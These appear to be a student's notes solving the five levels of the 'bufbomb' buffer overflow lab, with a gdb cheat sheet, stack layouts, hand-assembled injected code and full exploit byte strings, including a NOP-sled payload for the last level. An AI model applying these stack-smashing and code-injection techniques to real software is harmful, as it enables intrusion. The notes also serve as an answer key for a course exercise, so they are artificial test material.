
------------------------------------------------------------

GDB

------------------------------------------------------------

gdb <program>    -> load program into gdb
run <args>       -> Run program with <args>

disass section   -> Disassemble a section/func

break function   -> Set BP at func
break *address 	 -> Set BP at address (b* 0x8048b13)
info b           -> Info about BPs

x/10x $sp        -> Show 10 words from SP
p $esp 			 -> Value of SP 

info frame       -> Info about current stack frame	
info variables   -> All global and static variable names
info locals 	 -> Local variables of current stack frame" (names and values), including static variables in that function.
info args   	 -> Arguments of the current stack frame" (names and values).

si      		 -> Step through (Execute) 1 instruction	
x/i $pc          -> Show current instruction

q                -> Quit gdb

------------------------------------------------------------

0) CANDLE

------------------------------------------------------------

0x0804898d -> Address of <smoke>

Stack Words ->

	1) 00 00 00 00		//buf
	2) 00 00 00 00		//buf
	3) 00 00 00 00		//buf
	4) 00 00 00 00		//...
	5) 00 00 00 00		//...
	6) 00 00 00 00		//FP
	7) 8d 89 04 08		//&<smoke>  

Exploit String ->

	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 8d 89 04 08

------------------------------------------------------------

1) SPARKLER

------------------------------------------------------------

0x080489c3 -> Address of <fizz>
0x7dfea167 -> Cookie 

Stack Words ->

	1) 41 41 41 41		//buf
	2) 41 41 41 41		//buf 
	3) 41 41 41 41		//buf 
	4) 41 41 41 41		//... 
	5) 41 41 41 41		//... 
	6) 41 41 41 41		//FP 
	7) c3 89 04 08		//&<fizz>
	8) 41 41 41 41		//pseudo &<caller of fizz> 
	9) 67 a1 fe 7d		//param (cookie) 


Exploit String ->

	41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 c3 89 04 08 41 41 41 41 67 a1 fe 7d 

------------------------------------------------------------

2) FIRECRACKER

------------------------------------------------------------

0x0804b0f0 -> Address of cookie
0x0804b100 -> Address of global_value
0x08048a21 -> Address of <bang>
0xbfffb324 -> Address of buf/start of exploit code


Assembly ->

	mov   0x0804b0f0,%eax
	mov   %eax,0x804b100   //global_value = cookie
	push  $0x08048a21      //push &bang
	ret 

Byte Code ->

	0:	a1 f0 b0 04 08       	mov    0x804b0f0,%eax
	5:	a3 00 b1 04 08       	mov    %eax,0x804b100
	a:	68 21 8a 04 08       	push   $0x8048a21
	f:	c3                   	ret 

Stack Words ->

	1) a1 f0 b0 04		//ec <--
	2) 08 a3 00 b1		//ec...|
	3) 04 08 68 21		//ec...|
	4) 8a 04 08 c3		//ec...|
	5) 00 00 00 00		.......|
	6) 00 00 00 00		//FP...|
	7) bf ff b3 24		//&ec --

Exploit String ->

	a1 f0 b0 04 08 a3 00 b1 04 08 68 21 8a 04 08 c3 00 00 00 00 00 00 00 00 24 b3 ff bf

------------------------------------------------------------

3) DYNAMITE

------------------------------------------------------------

0x0804b0f0 -> Address of cookie
0x08048aa5 -> IP(test) before corruption
0xbfffb368 -> FP(test) before corruption
0xbfffb324 -> Address of buf/start of exploit code

Assembly ->

	mov   0x0804b0f0,%eax
	mov   $0xbfffb368,%ebp
	push  $0x08048aa5
	ret

Byte Code ->

	0:	a1 f0 b0 04 08       	mov    0x804b0f0,%eax
	5:	bd 68 b3 ff bf       	mov    $0xbfffb368,%ebp  //leal 	0x248(%eip),%ecx
	a:	68 a5 8a 04 08       	push   $0x8048aa5
	f:	c3                   	ret 

Stack Words ->

	1) a1 f0 b0 04 
	2) 08 bd 68 b3 
	3) ff bf 68 a5 
	4) 8a 04 08 c3
	5) 00 00 00 00		
	6) 00 00 00 00				
	7) 24 b3 ff bf

Exploit String ->

	a1 f0 b0 04 08 bd 68 b3 ff bf 68 a5 8a 04 08 c3 00 00 00 00	00 00 00 00 24 b3 ff bf


mov    0x804b0f0,%eax
leal   0x30(%esp),%ebp
push   $0x8048b56
ret 

------------------------------------------------------------

4) NITROGLYCERIN

------------------------------------------------------------

0x0804b0f0 -> Address of cookie
0x8048b56  -> IP(test) before corruption
0x28       -> Distance between 'return address pushed by testn' and '$ebp of testn' 



              0xbfffb120   .0xbfffb130                      .0xbfffb338 .0xbfffb368
...........................nnnnnnnnnnnnnnnniiiiiiaaaaaaaaaaa////////////
....................nnnnnnnnnnnnnnnniiiiiiaaaaaaaaaaa////////////........
.............nnnnnnnnnnnnnnnniiiiiiaaaaaaaaaaa////////////...............
0xbfffb0f0   .0xbfffb100                     .0xbfffb308 .0xbfffb338


//////////// -> testn frame


cat ip.txt | ./sendstring -n 5 | ./bufbomb -n -t amanc@iisc.ac.in


Assembly ->

	mov    0x804b0f0,%eax
	leal   0x28(%esp),%ebp
	push   $0x8048b56
	ret

Byte Code ->

	0:	a1 f0 b0 04 08       	mov    0x804b0f0,%eax
    5:	8d 6c 24 28          	lea    0x28(%esp),%ebp
    9:	68 56 8b 04 08       	push   $0x8048b56
    e:	c3                   	ret 

Exploit String ->

90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 

a1 f0 b0 04 08 8d 6c 24 28 68 56 8b 04 08 c3 

00 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf 30 b1 ff bf


------------------------------------------------------------
